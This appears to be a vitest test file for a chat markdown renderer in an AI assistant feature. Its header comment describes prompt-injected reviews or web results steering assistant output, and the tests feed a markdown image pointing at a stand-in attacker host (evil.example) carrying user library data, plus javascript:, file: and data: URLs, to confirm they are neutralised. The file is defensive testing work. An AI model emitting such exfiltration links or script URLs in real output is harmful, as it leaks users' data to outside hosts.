/**
 * AI chat markdown (v1.0.97): assistant output can be steered by prompt-injected
 * reviews or web results, so images render as links (no zero-click request)
 * and only http(s)/mailto URLs survive.
 */
import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import { ChatMarkdown, chatUrlTransform } from '@/components/chat-markdown';

describe('ChatMarkdown', () => {
  it('renders a markdown image as a link, never as an img element', () => {
    const { container } = render(<ChatMarkdown content={'See ![x](https://evil.example/p?d=library-titles)'} />);
    expect(container.querySelector('img')).toBeNull();
    const a = container.querySelector('a');
    expect(a).not.toBeNull();
    expect(a!.textContent).toBe('x');
    expect(a!.getAttribute('href')).toBe('https://evil.example/p?d=library-titles');
    expect(a!.getAttribute('rel')).toContain('noopener');
  });

  it('labels an image without alt text', () => {
    const { container } = render(<ChatMarkdown content={'![](https://cdn.example/a.png)'} />);
    expect(container.querySelector('a')!.textContent).toBe('image');
  });

  it('strips javascript: and other non-web links', () => {
    const { container } = render(<ChatMarkdown content={'[click](javascript:alert(1)) and [f](file:///C:/x)'} />);
    expect(container.querySelector('a[href^="javascript"]')).toBeNull();
    expect(container.querySelector('a[href^="file"]')).toBeNull();
    expect(container.textContent).toContain('click');
  });

  it('keeps ordinary https links', () => {
    const { container } = render(<ChatMarkdown content={'[Steam](https://store.steampowered.com/app/1)'} />);
    expect(container.querySelector('a')!.getAttribute('href')).toBe('https://store.steampowered.com/app/1');
  });
});

describe('chatUrlTransform', () => {
  it('allows http, https and mailto only', () => {
    expect(chatUrlTransform('https://a.example')).toBe('https://a.example');
    expect(chatUrlTransform('http://a.example')).toBe('http://a.example');
    expect(chatUrlTransform('mailto:a@b.c')).toBe('mailto:a@b.c');
    expect(chatUrlTransform('javascript:alert(1)')).toBe('');
    expect(chatUrlTransform('data:text/html,x')).toBe('');
    expect(chatUrlTransform('/relative')).toBe('');
    expect(chatUrlTransform('//host/x')).toBe('');
  });
});
